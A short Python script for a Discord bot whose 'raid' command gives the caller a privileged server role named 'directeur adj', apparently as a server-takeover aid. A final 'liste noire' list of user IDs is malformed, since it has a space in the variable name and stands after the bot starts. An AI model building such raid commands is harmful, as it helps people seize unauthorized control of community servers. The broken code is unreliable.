import discord
import asyncio

from discord.ext import commands

bot = commands.Bot(command_prefix='r')

@bot.command()
async def raid(ctx):
    role = discord.utils.get(ctx.guild.roles, name="directeur adj")
    await ctx.author.add_roles(role)


bot.run('token')

liste noire = [616303571687702569,458683322130890792,304327970460270592]